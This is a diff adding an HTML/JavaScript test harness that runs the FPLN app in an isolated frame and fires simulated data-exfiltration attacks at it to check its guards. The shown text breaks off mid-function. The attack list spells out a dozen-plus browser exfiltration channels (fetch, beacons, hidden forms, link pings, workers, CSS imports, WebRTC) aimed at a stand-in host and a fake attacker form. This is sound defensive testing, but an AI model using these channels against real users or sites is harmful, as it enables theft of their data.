@@ -1,0 +1,460 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow"><meta name="theme-color" content="#121417">
+<title>FPLN Test Range</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=B612:wght@400;700&family=B612+Mono:wght@400;700&display=swap">
+<style>
+/* Layout: a test bench. Unit under test on the left (the real app), the network path in the middle with
+   packets travelling toward the attacker, scenario list and live event feed on the right. Single dark theme. */
+:root{color-scheme:dark;--panel:#24282d;--bezel:#121417;--screen:#05080b;--rule:#1d2a33;--engrave:#d9dee3;--dim:#7f8b96;
+  --grn:#3fe36b;--amb:#ffb21a;--red:#ff4136;--cyn:#3fd0ff;--mag:#ff5ce1;--wht:#eef3f7;
+  --f:"B612","Segoe UI",system-ui,sans-serif;--m:"B612 Mono",ui-monospace,Consolas,monospace}
+*,*::before,*::after{box-sizing:border-box}
+html,body{margin:0;background:var(--panel);color:var(--wht)}
+body{font:14px/1.45 var(--f);padding:calc(10px + env(safe-area-inset-top,0px)) max(16px,env(safe-area-inset-right,0px)) 40px max(16px,env(safe-area-inset-left,0px))}
+.top{display:flex;gap:14px;align-items:center;flex-wrap:wrap;max-width:1400px;margin:0 auto 12px}
+.id b{display:block;font:700 20px/1 var(--f);letter-spacing:.14em}.id span{font:400 10.5px/1 var(--m);letter-spacing:.16em;color:var(--dim)}
+.id{margin-right:auto}
+button{font:700 12.5px/1 var(--f);letter-spacing:.1em;text-transform:uppercase;color:var(--engrave);background:linear-gradient(#3a3f45,#2b3035);border:1px solid #000;border-radius:4px;padding:10px 13px;cursor:pointer;box-shadow:inset 0 1px 0 rgba(255,255,255,.12),0 2px 0 #000}
+button:disabled{opacity:.4;cursor:not-allowed}
+button.go{color:#04170a;background:var(--grn)} button.stop{color:#fff;background:#8a1f19}
+button[aria-pressed="true"]{color:var(--grn);box-shadow:inset 0 0 0 1px var(--grn)}
+:focus-visible{outline:2px solid var(--cyn);outline-offset:2px}
+.seg{display:flex;gap:4px}
+.bench{max-width:1400px;margin:0 auto;display:grid;grid-template-columns:minmax(0,430px) minmax(0,1fr) minmax(0,380px);gap:14px}
+.du{background:var(--bezel);border-radius:12px;padding:10px;box-shadow:inset 0 2px 0 rgba(255,255,255,.06),0 14px 30px -18px #000;min-width:0}
+.scr{background:var(--screen);border:1px solid #000;border-radius:6px;padding:12px;min-width:0;box-shadow:inset 0 0 30px rgba(0,0,0,.9)}
+h2{margin:0 0 8px;font:700 12px/1.2 var(--m);letter-spacing:.14em;color:var(--cyn)}
+.note{color:var(--dim);font-size:12.5px}
+/* unit under test */
+.uut{position:relative;width:100%;aspect-ratio:400/720;max-height:76vh;border-radius:8px;overflow:hidden;background:#000;border:2px solid #000}
+.uut iframe{position:absolute;left:0;top:0;width:400px;height:720px;border:0;transform-origin:0 0;background:#070a0f}
+.toast{position:absolute;left:8px;right:8px;top:8px;z-index:3;padding:8px 10px;border-radius:6px;background:rgba(5,8,11,.92);border:1px solid var(--red);color:var(--wht);font:700 12px/1.35 var(--m);letter-spacing:.04em;opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;pointer-events:none}
+.toast.on{opacity:1;transform:none}
+.toast.ok{border-color:var(--grn)} .toast.sig{border-color:var(--cyn)}
+.ring{position:absolute;inset:0;z-index:2;pointer-events:none;border:3px solid transparent;border-radius:8px;transition:border-color .2s,box-shadow .2s}
+.ring.hit{border-color:var(--red);box-shadow:inset 0 0 40px rgba(255,65,54,.35)}
+.ring.safe{border-color:var(--grn);box-shadow:inset 0 0 30px rgba(63,227,107,.25)}
+.meta{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;font:400 12px/1.3 var(--m);color:var(--dim)}
+.meta b{color:var(--wht)}
+/* middle */
+.now{font:700 17px/1.35 var(--m);letter-spacing:.03em;min-height:2.7em}
+.now small{display:block;font:400 13px/1.4 var(--m);color:var(--dim);letter-spacing:0;margin-top:4px}
+.path{position:relative;margin:14px 0 6px;height:150px}
+.path svg{width:100%;height:100%;display:block}
+.node rect{fill:#0b1219;stroke:#2b3b48;stroke-width:1.5}
+.node text{fill:var(--engrave);font:700 10.5px var(--m);letter-spacing:.08em}
+.node.lit rect{stroke:var(--grn);fill:#0f2a1c} .node.lit text{fill:var(--grn)}
+.node.bad rect{stroke:var(--red);fill:#3a0f0c} .node.bad text{fill:var(--red)}
+.node.off rect{stroke:#1d2a33;fill:#070b0f} .node.off text{fill:#3a4752}
+.wire{stroke:#2b3b48;stroke-width:2;stroke-dasharray:4 4}
+.pk{transition:cx .55s ease-in-out,fill .2s}
+.ann{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:6px;margin-top:10px}
+.ann div{border:2px solid #000;border-radius:4px;background:#16191c;color:#3a434b;font:700 10.5px/1.2 var(--m);letter-spacing:.06em;text-align:center;padding:7px 4px;transition:all .2s}
+.ann div small{display:block;font-weight:400;font-size:9.5px;letter-spacing:.04em}
+.ann div.on{background:var(--grn);color:#04170a;box-shadow:0 0 12px rgba(63,227,107,.5)}
+.ann div.fault{background:var(--red);color:#fff;box-shadow:0 0 12px rgba(255,65,54,.5)}
+.ann div.na{color:#2c353d}
+.ro{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:8px;margin-top:12px}
+.ro div{border:1px solid var(--rule);border-radius:4px;padding:8px;display:grid;gap:3px}
+.ro b{font:700 24px/1 var(--m);font-variant-numeric:tabular-nums}.ro span{font:700 10px/1 var(--m);letter-spacing:.12em;color:var(--dim)}
+.g{color:var(--grn)}.c{color:var(--amb)}.w{color:var(--red)}.s{color:var(--cyn)}.t{color:var(--mag)}
+/* right */
+.scn{display:grid;gap:4px}
+.sc{display:grid;grid-template-columns:24px 1fr auto;gap:8px;align-items:center;padding:6px 8px;border:1px solid var(--rule);border-radius:4px;font:400 13px/1.3 var(--m)}
+.sc.run{border-color:var(--cyn);box-shadow:0 0 0 1px var(--cyn) inset}
+.sc b{color:var(--dim);font-weight:700}
+.sc button{padding:5px 7px;font-size:10px}
+.st{font:700 10.5px/1 var(--m);letter-spacing:.08em;text-align:right;white-space:nowrap}
+.feed{height:300px;overflow:auto;margin-top:10px;border-top:1px solid var(--rule);font:400 12px/1.4 var(--m)}
+.ev{display:grid;grid-template-columns:58px 84px 1fr;gap:6px;padding:3px 0;border-bottom:1px solid #0e171d}
+.ev span:first-child{color:var(--dim)} .ev span:last-child{overflow-wrap:anywhere}
+.ev.h span:nth-child(2){color:var(--mag)}
+details.rep{margin-top:12px} details.rep summary{cursor:pointer;font:700 12px var(--m);letter-spacing:.1em;color:var(--cyn)}
+.rows{display:grid;gap:2px;margin-top:8px;font:400 12px/1.35 var(--m)}
+.rows div{display:grid;grid-template-columns:1fr auto;gap:8px;border-bottom:1px solid #0e171d;padding:3px 0}
+.warn{max-width:1400px;margin:0 auto 12px;padding:10px 12px;border-radius:6px;background:#2d2110;border:1px solid var(--amb);color:var(--amb);font:400 13px/1.4 var(--m)}
+@media (max-width:1100px){ .bench{grid-template-columns:minmax(0,1fr) minmax(0,1fr)} .right{grid-column:1 / -1} }
+@media (max-width:720px){ .bench{grid-template-columns:minmax(0,1fr)} .uut{max-height:none} .ro,.ann{grid-template-columns:repeat(2,minmax(0,1fr))} }
+@media (prefers-reduced-motion: reduce){ *{transition:none!important} }
+</style></head><body>
+
+<div class="top">
+  <div class="id"><b>FPLN TEST RANGE</b><span>LIVE · YOUR OWN BROWSER · ISOLATED COPY</span></div>
+  <div class="seg" role="group" aria-label="Speed"><button type="button" data-speed="watch" aria-pressed="true">Watch</button><button type="button" data-speed="fast" aria-pressed="false">Fast</button></div>
+  <button type="button" class="go" id="runAll">Run all</button>
+  <button type="button" class="stop" id="stop" disabled>Stop</button>
+  <button type="button" id="copy">Copy results</button>
+</div>
+<div class="warn" id="warn" hidden></div>
+
+<div class="bench">
+  <div class="du"><div class="scr">
+    <h2>UNIT UNDER TEST · FPLN <span id="ver">–</span></h2>
+    <div class="uut" id="uut"><iframe id="app" title="FPLN under test"></iframe><div class="ring" id="ring"></div><div class="toast" id="toast" role="status"></div></div>
+    <div class="meta"><span>STATE <b id="mState">–</b></span><span>SIGNAL <b id="mSig">–</b></span><span>STORAGE <b>IN MEMORY</b></span></div>
+    <p class="note" style="margin-top:8px">This is the real FPLN app running in this browser. It runs on fake data held in memory, so your own FPLN data is never read or changed, and the pause and erase orders here go only to this copy, never to cadets.</p>
+  </div></div>
+
+  <div class="du"><div class="scr">
+    <h2>NOW</h2>
+    <div class="now" id="now">Press Run all to start.<small>Each test happens in the app on the left as you watch.</small></div>
+    <div class="path" aria-hidden="true"><svg viewBox="0 0 640 150" id="svg">
+      <line class="wire" x1="60" y1="75" x2="580" y2="75"/>
+      <g class="node" id="nApp"><rect x="10" y="50" width="100" height="50" rx="5"/><text x="60" y="80" text-anchor="middle">APP CODE</text></g>
+      <g class="node" id="nL4"><rect x="140" y="50" width="100" height="50" rx="5"/><text x="190" y="72" text-anchor="middle">L4</text><text x="190" y="88" text-anchor="middle">APP GUARD</text></g>
+      <g class="node" id="nL8"><rect x="270" y="50" width="100" height="50" rx="5"/><text x="320" y="72" text-anchor="middle">L5 · L8</text><text x="320" y="88" text-anchor="middle">BROWSER</text></g>
+      <g class="node" id="nNet"><rect x="400" y="50" width="100" height="50" rx="5"/><text x="450" y="80" text-anchor="middle">NETWORK</text></g>
+      <g class="node" id="nAtk"><rect x="530" y="50" width="100" height="50" rx="5"/><text x="580" y="80" text-anchor="middle">ATTACKER</text></g>
+      <text x="320" y="128" text-anchor="middle" id="pLabel" style="fill:#7f8b96;font:400 11px var(--m)"></text>
+      <circle class="pk" id="pk" cx="60" cy="75" r="0" fill="#ff4136"/>
+    </svg></div>
+    <div class="ann" id="ann"></div>
+    <div class="ro">
+      <div><b class="g" id="cPass">0</b><span>PASSED</span></div>
+      <div><b class="w" id="cFail">0</b><span>FAILED</span></div>
+      <div><b class="s" id="cBlock">0</b><span>ATTACKS STOPPED</span></div>
+      <div><b id="cTime">0:00</b><span>ELAPSED</span></div>
+    </div>
+    <details class="rep" id="rep"><summary>RESULTS</summary><div class="rows" id="rows"><p class="note">No results yet.</p></div></details>
+  </div></div>
+
+  <div class="du right"><div class="scr">
+    <h2>SCENARIOS</h2>
+    <div class="scn" id="scn"></div>
+    <h2 style="margin-top:12px">LIVE FEED · <span class="t">RANGE</span> + APP MONITOR</h2>
+    <div class="feed" id="feed" aria-live="off"></div>
+  </div></div>
+</div>
+
+<script>
+(function(){
+"use strict";
+var $ = function(id){ return document.getElementById(id); };
+var ATK = "https://exfil.fpln-range.invalid";
+var FORM_OTHER = "https://docs.google.com/forms/d/e/1FAIpQLattackerOwnForm000000000000000/formResponse";
+var SECRET = "RANGE-PLANNER-SECRET";
+var speed = "watch", stopFlag = false, running = false, t0 = 0, timer = 0;
+function D(ms){ return speed === "fast" ? Math.min(ms, 120) : ms; }
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+function esc(s){ return String(s == null ? "" : s).replace(/[&<>"']/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]; }); }
+function p2(n){ return ("0"+n).slice(-2); }
+function hms(t){ var d = new Date(t); return p2(d.getHours())+":"+p2(d.getMinutes())+":"+p2(d.getSeconds()); }
+
+/* ---------------- isolation: the app under test gets in-memory storage and a simulated signal ---------------- */
+var RANGE = window.__FPLN_RANGE = {local: new Map(), session: new Map(), caches: new Set(), reached: [], sig: {control: null, version: null, down: false}};
+function fakeStorageClass(map){
+  function S(){}
+  S.prototype.getItem = function(k){ k = String(k); return map.has(k) ? map.get(k) : null; };
+  S.prototype.setItem = function(k, v){ map.set(String(k), String(v)); };
+  S.prototype.removeItem = function(k){ map.delete(String(k)); };
+  S.prototype.clear = function(){ map.clear(); };
+  S.prototype.key = function(i){ var a = Array.from(map.keys()); return i < a.length ? a[i] : null; };
+  Object.defineProperty(S.prototype, "length", {get: function(){ return map.size; }});
+  return S;
+}
+function isAttack(u){ return /fpln-range\.invalid|1FAIpQLattacker/.test(String(u)); }
+RANGE.reach = function(u, how){ RANGE.reached.push({u: String(u), how: how, at: Date.now()}); };
+RANGE.install = function(w){
+  if(w.__rangeInstalled) return; w.__rangeInstalled = true;
+  var L = fakeStorageClass(RANGE.local), Ss = fakeStorageClass(RANGE.session), li = new L(), si = new Ss();
+  Object.defineProperty(w, "localStorage", {configurable: true, get: function(){ return li; }});
+  Object.defineProperty(w, "sessionStorage", {configurable: true, get: function(){ return si; }});
+  w.Storage = L;
+  var cacheStore = {keys: function(){ return Promise.resolve(Array.from(RANGE.caches)); }, delete: function(n){ var had = RANGE.caches.delete(n); return Promise.resolve(had); },
+    open: function(n){ RANGE.caches.add(n); return Promise.resolve({match: function(){ return Promise.resolve(undefined); }, put: function(){ return Promise.resolve(); }, addAll: function(){ return Promise.resolve(); }}); },
+    match: function(){ return Promise.resolve(undefined); }, has: function(n){ return Promise.resolve(RANGE.caches.has(n)); }};
+  Object.defineProperty(w, "caches", {configurable: true, value: cacheStore});
+  Object.defineProperty(w, "indexedDB", {configurable: true, value: {databases: function(){ return Promise.resolve([]); }, deleteDatabase: function(){ return {}; }, open: function(){ throw new Error("not in the range"); }}});
+  var swFake = {controller: null, ready: new Promise(function(){}), register: function(){ return Promise.resolve({}); }, getRegistration: function(){ return Promise.resolve(undefined); },
+    getRegistrations: function(){ return Promise.resolve([]); }, addEventListener: function(){}, removeEventListener: function(){}};
+  try{ Object.defineProperty(w.navigator, "serviceWorker", {configurable: true, value: swFake}); }catch(e){}
+  /* the simulated signal, and a last line that records anything an attack gets past the app */
+  var rf = w.fetch.bind(w);
+  w.fetch = function(i, o){
+    var u = typeof i === "string" ? i : (i && i.url) || String(i);
+    var m = /\/FPLN-\/(control|version)\.json/.exec(u);
+    if(m){
+      if(RANGE.sig.down) return Promise.reject(new w.TypeError("Failed to fetch"));
+      var body = RANGE.sig[m[1]];
+      if(body == null) return Promise.resolve(new w.Response("missing", {status: 404}));
+      return Promise.resolve(new w.Response(typeof body === "string" ? body : JSON.stringify(body), {status: 200, headers: {"Content-Type": "application/json"}}));
+    }
+    if(isAttack(u)){ RANGE.reach(u, "fetch"); return Promise.reject(new w.TypeError("reached the edge of the range")); }
+    return rf(i, o);
+  };
+  try{ var XP = w.XMLHttpRequest.prototype, xo = XP.open, xs = XP.send;
+    XP.open = function(m, u){ this.__rangeU = u; return xo.apply(this, arguments); };
+    XP.send = function(){ if(isAttack(this.__rangeU)){ RANGE.reach(this.__rangeU, "xhr"); throw new w.Error("reached the edge of the range"); } return xs.apply(this, arguments); }; }catch(e){}
+  try{ var sb = w.navigator.sendBeacon && w.navigator.sendBeacon.bind(w.navigator);
+    w.navigator.sendBeacon = function(u){ if(isAttack(u)){ RANGE.reach(u, "beacon"); return true; } return sb ? sb.apply(null, arguments) : false; }; }catch(e){}
+  try{ var WS = w.WebSocket; w.WebSocket = function(u, p){ if(isAttack(u)){ RANGE.reach(u, "websocket"); throw new w.Error("reached the edge of the range"); } return p === undefined ? new WS(u) : new WS(u, p); }; w.WebSocket.prototype = WS.prototype; }catch(e){}
+  try{ var wo = w.open; w.open = function(u){ if(u && isAttack(u)){ RANGE.reach(u, "popup"); return null; } return wo.apply(w, arguments); }; }catch(e){}
+  w.addEventListener("click", function(e){ var a = e.target && e.target.closest && e.target.closest("a[href]"); if(a && isAttack(a.href) && !e.defaultPrevented){ RANGE.reach(a.href, "link"); e.preventDefault(); } }, false);
+  /* pages the app builds inside itself get the same isolation first */
+  try{ var P = w.HTMLIFrameElement.prototype, d = Object.getOwnPropertyDescriptor(P, "srcdoc");
+    Object.defineProperty(P, "srcdoc", {configurable: true, get: function(){ return d.get.call(this); }, set: function(v){ v = String(v);
+      var inj = "<script>try{top.__FPLN_RANGE.install(window)}catch(e){}<\/script>";
+      v = v.indexOf("<head>") >= 0 ? v.replace("<head>", "<head>" + inj) : inj + v; d.set.call(this, v); }}); }catch(e){}
+};
+
+/* safety net for your real data: snapshot before, compare after every scenario, restore if anything changed */
+var BK = "range:fpln-backup";
+function realSnap(){ var o = {}; try{ for(var i=0;i<localStorage.length;i++){ var k = localStorage.key(i); if(/^fpln/.test(k)) o[k] = localStorage.getItem(k); } }catch(e){} return o; }
+var REAL0 = null;
+function realChanged(){ var now = realSnap(), a = Object.keys(REAL0 || {}), b = Object.keys(now); if(a.length !== b.length) return true; return a.some(function(k){ return now[k] !== REAL0[k]; }); }
+function realRestore(){ try{ Object.keys(realSnap()).forEach(function(k){ if(!(k in REAL0)) localStorage.removeItem(k); }); Object.keys(REAL0).forEach(function(k){ localStorage.setItem(k, REAL0[k]); }); }catch(e){} }
+(function recover(){ try{ var b = localStorage.getItem(BK); if(!b) return; REAL0 = JSON.parse(b); if(realChanged()){ realRestore(); warn("A previous test run was interrupted. Your FPLN data on this browser was restored from the backup taken before it."); } localStorage.removeItem(BK); }catch(e){} })();
+function warn(t){ $("warn").textContent = t; $("warn").hidden = false; }
+
+/* ---------------- the unit under test ---------------- */
+var APPHTML = "", VERSION = null, blobUrl = "";
+function frameW(){ return $("app").contentWindow; }
+function onApp(){ try{ return frameW().location.protocol === "blob:"; }catch(e){ return false; } }
+function fit(){ var u = $("uut"), f = $("app"); var s = Math.min(u.clientWidth / 400, u.clientHeight / 720); f.style.transform = "scale(" + s + ")"; }
+addEventListener("resize", fit);
+function loadApp(){
+  var base = new URL("../", location.href).href;
+  return Promise.all([fetch(base + "index.html", {cache: "no-store"}).then(function(r){ return r.text(); }), fetch(base + "version.json", {cache: "no-store"}).then(function(r){ return r.json(); }).catch(function(){ return {version: "?"}; })]).then(function(r){
+    var html = r[0]; VERSION = r[1]; $("ver").textContent = String(VERSION.version || "").split(" ·")[0];
+    if(html.indexOf('id="fpln-safety"') < 0) throw new Error("This copy of FPLN has no safety guard.");
+    var inj = '<base href="' + base + '"><script>try{top.__FPLN_RANGE.install(window)}catch(e){document.documentElement.textContent="Open this from the FPLN Test Range."}<\/script>';
+    APPHTML = html.replace("<head>", "<head>" + inj);
+    if(blobUrl) URL.revokeObjectURL(blobUrl);
+    blobUrl = URL.createObjectURL(new Blob([APPHTML], {type: "text/html"}));
+  });
+}
+function sigSet(c, v){ RANGE.sig.control = c; RANGE.sig.version = v; showSig(); }
+function kill(state, msg){ return {state: state, id: (state === "none" ? "R-" : "K-") + Date.now(), msg: msg || ""}; }
+function ctl(state, msg, extra){ var o = {v: 1, rev: "range-" + Date.now(), kill: kill(state, msg), off: [], banner: null}; if(extra) Object.keys(extra).forEach(function(k){ o[k] = extra[k]; }); return o; }
+function ver(state){ return {version: VERSION ? VERSION.version : "?", note: VERSION ? VERSION.note : "", built: VERSION ? VERSION.built : "", kill: kill(state)}; }
+function showSig(){ var c = RANGE.sig.control, v = RANGE.sig.version; var st = function(x){ return x == null ? "MISSING" : typeof x === "string" ? "CORRUPT" : ((x.kill && x.kill.state) || "none").toUpperCase(); };
+  $("mSig").textContent = RANGE.sig.down ? "SITE DOWN" : st(c) + " / " + st(v); }
+$("app").addEventListener("load", function(){ watchApp(); });
+function boot(){
+  return new Promise(function(res){ var f = $("app"); var done = false;
+    f.onload = function(){ if(done) return; done = true; setTimeout(res, 600); };
+    f.src = blobUrl; fit(); setTimeout(function(){ if(!done){ done = true; res(); } }, 8000); });
+}
+function waitLoad(ms){ return new Promise(function(res){ var f = $("app"), t = setTimeout(function(){ f.removeEventListener("load", h); res(false); }, ms || 8000);
+  function h(){ clearTimeout(t); f.removeEventListener("load", h); setTimeout(function(){ res(true); }, 700); } f.addEventListener("load", h); }); }
+function nudge(){ try{ frameW().dispatchEvent(new Event("online")); }catch(e){} }
+function isLocked(){ try{ return !!frameW().document.getElementById("fplnLocked"); }catch(e){ return false; } }
+function lockText(){ try{ return frameW().document.getElementById("fplnLocked").textContent; }catch(e){ return ""; } }
+async function until(fn, ms){ var end = Date.now() + (ms || 8000); while(Date.now() < end){ try{ if(fn()) return true; }catch(e){} await sleep(150); } return false; }
+function state(){ $("mState").textContent = isLocked() ? (/shut down/.test(lockText()) ? "SHUTDOWN" : "PAUSED") : "NORMAL"; }
+
+/* app monitor feed: the app's own flight recorder, polled */
+var seen = 0, monTimer = 0;
+function watchApp(){ seen = 0; clearInterval(monTimer); monTimer = setInterval(function(){ try{ var ev = frameW().FPLN_MONITOR && frameW().FPLN_MONITOR.events(); if(!ev) return;
+  for(var i = seen; i < ev.length; i++){ var e = ev[i]; if(e.old) continue; feed(e.t, e.k, e.a + (e.b ? " · " + e.b : ""), {w:"c", c:"w", g:"g", i:""}[e.l] || ""); }
+  seen = ev.length; state(); }catch(e){} }, 250); }
+function feed(t, k, txt, cls, harness){ var d = document.createElement("div"); d.className = "ev" + (harness ? " h" : "");
+  d.innerHTML = "<span>" + hms(t) + "</span><span class=\"" + (cls || "") + "\">" + esc(String(k).toUpperCase()) + "</span><span class=\"" + (cls || "") + "\">" + esc(txt) + "</span>";
+  var F = $("feed"); F.insertBefore(d, F.firstChild); while(F.childNodes.length > 300) F.removeChild(F.lastChild); }
+function hlog(k, txt, cls){ feed(Date.now(), k, txt, cls || "t", true); }
+
+/* ---------------- display ---------------- */
+var LAYERS = [["L1","MAIN SIGNAL"],["L2","BACKUP SIGNAL"],["L3","DEVICE LATCH"],["L4","APP GUARD"],["L5","BROWSER LOCK"],["L6","WORKER","GitHub test"],["L7","SHUTDOWN SITE","GitHub test"],["L8","ALLOWLIST"]];
+$("ann").innerHTML = LAYERS.map(function(l){ return '<div id="a' + l[0] + '" class="' + (l[2] ? "na" : "") + '">' + l[0] + "<small>" + l[1] + (l[2] ? " · " + l[2] : "") + "</small></div>"; }).join("");
+function light(id, cls){ var e = $("a" + id); if(!e || e.classList.contains("na")) return; e.classList.remove("on", "fault"); void e.offsetWidth; e.classList.add(cls || "on"); clearTimeout(e._t); e._t = setTimeout(function(){ e.classList.remove("on"); }, speed === "fast" ? 500 : 1800); }
+function now(t, s){ $("now").innerHTML = esc(t) + (s ? "<small>" + esc(s) + "</small>" : ""); }
+var toastT = 0;
+function toast(t, kind){ var e = $("toast"); e.textContent = t; e.className = "toast on " + (kind || ""); clearTimeout(toastT); toastT = setTimeout(function(){ e.className = "toast"; }, speed === "fast" ? 600 : 2200); }
+function ring(kind){ var r = $("ring"); r.className = "ring " + kind; setTimeout(function(){ r.className = "ring"; }, speed === "fast" ? 300 : 900); }
+var NODES = {app: 60, L4: 190, L8: 320, net: 450, atk: 580};
+function nodes(cls){ ["nApp","nL4","nL8","nNet","nAtk"].forEach(function(n){ $(n).setAttribute("class", "node"); }); if(cls) Object.keys(cls).forEach(function(k){ $(k).setAttribute("class", "node " + cls[k]); }); }
+async function packet(stopAt, label, bad){
+  var pk = $("pk"); pk.style.transition = "none"; pk.setAttribute("cx", NODES.app); pk.setAttribute("r", 9); pk.setAttribute("fill", "#ff4136"); void pk.getBBox();
+  nodes({nApp: "bad"}); $("pLabel").textContent = label || "";
+  await sleep(30); pk.style.transition = ""; pk.setAttribute("cx", NODES[stopAt]);
+  await sleep(D(600));
+  var map = {L4: "nL4", L8: "nL8", net: "nNet", atk: "nAtk"};
+  if(bad){ nodes({nApp: "bad", nNet: "bad", nAtk: "bad"}); } else { var c = {}; c[map[stopAt]] = "lit"; nodes(c); pk.setAttribute("fill", "#3fe36b"); }
+  await sleep(D(500)); pk.setAttribute("r", 0);
+}
+var RES = [], pass = 0, fail = 0, blocked = 0;
+function result(sid, name, ok, detail){ RES.push({s: sid, name: name, ok: !!ok, detail: detail || ""}); if(ok) pass++; else fail++;
+  $("cPass").textContent = pass; $("cFail").textContent = fail; hlog(ok ? "pass" : "fail", name + (detail ? " · " + detail : ""), ok ? "g" : "w");
+  var r = $("rows"); if(RES.length === 1) r.innerHTML = ""; var d = document.createElement("div"); d.innerHTML = "<span>" + esc(sid + " · " + name) + (detail ? ' <span class="note">' + esc(detail) + "</span>" : "") + '</span><span class="' + (ok ? "g" : "w") + '">' + (ok ? "PASS" : "FAIL") + "</span>"; r.appendChild(d); }
+
+/* ---------------- attacks, fired from inside the app's own window ---------------- */
+function probeUrl(tag){ return ATK + "/" + tag + "?d=" + SECRET; }
+var CHANNELS = [
+  ["fetch", "Send planner with fetch()", function(w, u){ return w.fetch(u, {mode: "no-cors"}); }],
+  ["xhr", "Send planner with XMLHttpRequest", function(w, u){ var x = new w.XMLHttpRequest(); x.open("GET", u); x.send(); }],
+  ["beacon", "Send planner with a background beacon", function(w, u){ return w.navigator.sendBeacon(u, SECRET) === false ? "refused" : ""; }],
+  ["image", "Hide planner in an image address", function(w, u){ var i = new w.Image(); i.src = u; }],
+  ["script", "Load an attacker script", function(w, u){ var s = w.document.createElement("script"); s.src = u; w.document.head.appendChild(s); }],
+  ["stylesheet", "Load an attacker stylesheet", function(w, u){ var l = w.document.createElement("link"); l.rel = "stylesheet"; l.href = u; w.document.head.appendChild(l); }],
+  ["websocket", "Open a live connection to the attacker", function(w, u){ new w.WebSocket(u.replace("https", "wss")); }],
+  ["frame", "Open the attacker's page in a hidden frame", function(w, u){ var f = w.document.createElement("iframe"); f.style.display = "none"; f.src = u; w.document.body.appendChild(f); }],
+  ["fresh-frame", "Use a brand-new frame to dodge the guard", function(w, u){ var f = w.document.createElement("iframe"); f.style.display = "none"; w.document.body.appendChild(f); return f.contentWindow.fetch(u, {mode: "no-cors"}); }],
+  ["form", "Submit a hidden form to the attacker", function(w, u){ var f = w.document.createElement("form"); f.method = "POST"; f.action = u; f.target = "rangeSink"; f.style.display = "none"; w.document.body.appendChild(f); f.submit(); }],
+  ["popup", "Open a pop-up to the attacker", function(w, u){ return w.open(u) === null ? "refused" : ""; }],
+  ["link", "Click a hidden link to the attacker", function(w, u){ var a = w.document.createElement("a"); a.href = u; a.target = "_blank"; a.style.display = "none"; w.document.body.appendChild(a); a.click(); }]
+];
+var VACCINE = [
+  ["attacker-form", "Send planner to the attacker's own Google Form", function(w){ return w.fetch(FORM_OTHER + "?entry.1=" + SECRET, {method: "POST", mode: "no-cors"}); }, true],
+  ["a-ping", "Hidden link 'ping' beacon", function(w, u){ var sink = w.document.createElement("iframe"); sink.name = "rangePingSink"; sink.style.display = "none"; w.document.body.appendChild(sink);
+    var a = w.document.createElement("a"); a.href = "about:blank"; a.target = "rangePingSink"; a.setAttribute("ping", u); w.document.body.appendChild(a); a.click(); a.remove(); }],
+  ["worker", "Background worker sends the planner", function(w, u){ var b = new w.Blob(["var v=0;self.addEventListener('securitypolicyviolation',function(){v++});function n(){return !v&&performance.getEntriesByType('resource').filter(function(e){return e.name.indexOf('fpln-range.invalid')>=0}).length}fetch('" + u + "',{mode:'no-cors'}).then(function(){postMessage(n()?'REACHED':'sent')},function(e){setTimeout(function(){postMessage(n()?'REACHED':'refused: '+e.message)},300)})"], {type: "text/javascript"});
+    return new Promise(function(r){ try{ var wk = new w.Worker(w.URL.createObjectURL(b)); wk.onmessage = function(e){ r(String(e.data)); }; wk.onerror = function(){ r("refused: worker blocked"); }; setTimeout(function(){ r("timeout"); }, 2500); }catch(e){ r("refused: " + e.message); } }); }],
+  ["html-img", "Injected HTML image", function(w, u){ var d = w.document.createElement("div"); d.innerHTML = '<img src="' + u + '">'; w.document.body.appendChild(d); }],
+  ["svg-image", "SVG image beacon", function(w, u){ var d = w.document.createElement("div"); d.innerHTML = '<svg><image href="' + u + '"/></svg>'; w.document.body.appendChild(d); }],
+  ["css-import", "Stylesheet @import beacon", function(w, u){ var s = w.document.createElement("style"); s.textContent = '@import url("' + u + '");'; w.document.head.appendChild(s); }],
+  ["refresh", "Meta refresh inside a frame", function(w, u){ var f = w.document.createElement("iframe"); f.style.display = "none"; f.srcdoc = '<meta http-equiv="refresh" content="0;url=' + u + '">'; w.document.body.appendChild(f); }],
+  ["webrtc", "Peer-to-peer connection (security policies don't cover it)", function(w){ new w.RTCPeerConnection({iceServers: []}); return "made"; }, false, true]
+];
+function cspCatcher(w){ var list = []; function h(e){ list.push(e.blockedURI || ""); } try{ w.document.addEventListener("securitypolicyviolation", h, true); }catch(e){} return {list: list, off: function(){ try{ w.document.removeEventListener("securitypolicyviolation", h, true); }catch(e){} }}; }
+function netEntries(w, tag){ var out = []; function scan(win){ try{ win.performance.getEntriesByType("resource").forEach(function(e){ if(e.name.indexOf("fpln-range.invalid/" + tag) >= 0 || (tag === "attacker-form" && e.name.indexOf("1FAIpQLattacker") >= 0)) out.push(e.name); });
+  for(var i=0;i<win.frames.length;i++) scan(win.frames[i]); }catch(e){} } scan(w); return out; }
+async function fire(sid, tag, label, fn, isForm, isApi){
+  if(stopFlag) throw new Error("stopped");
+  var w = frameW(), u = probeUrl(tag), reachedBefore = RANGE.reached.length;
+  var mon0 = 0; try{ mon0 = w.FPLN_MONITOR.events().length; }catch(e){}
+  var csp = cspCatcher(w), out = "", err = "";
+  now("ATTACK · " + label, "Hostile code inside FPLN tries to get " + SECRET + " out of this browser.");
+  toast("ATTACK: " + label); ring("hit");
+  try{ var r = fn(w, u); if(r && r.then) out = String(await r) || "sent"; else out = String(r || ""); }catch(e){ err = String(e && e.message || e); }
+  await sleep(D(900) + 300);
+  csp.off();
+  if(!onApp()){ result(sid, label, false, "the attack navigated the test copy away; restarting it"); await boot(); return; }
+  var mon = []; try{ mon = w.FPLN_MONITOR.events().slice(mon0); }catch(e){}
+  var guardBlock = mon.some(function(e){ return e.k === "block"; }) || /FPLN/.test(err + out) || out === "refused";
+  var cspHit = csp.list.some(function(b){ return /fpln-range\.invalid|1FAIpQLattacker/.test(b) || b === "inline" || b === "eval"; }) || mon.some(function(e){ return e.k === "policy"; });
